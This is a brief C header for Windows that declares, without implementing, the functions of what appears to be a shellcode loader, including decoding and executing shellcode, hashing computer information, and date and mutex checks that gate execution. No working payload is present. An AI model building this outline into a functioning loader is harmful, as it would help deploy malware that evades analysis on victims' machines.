#include <Windows.h>
#include <WinUser.h>

HGLOBAL GenerateHash(BYTE *, unsigned int);
HGLOBAL * GetComputerInfo(COMPUTER_NAME_FORMAT);
void CheckExecution();
unsigned int HashCheck();
void DecodeShellcode();
void ExecuteShellcode(BYTE *, unsigned int);
unsigned int DateTimeCheck();
unsigned int MutexCheck(const char *);
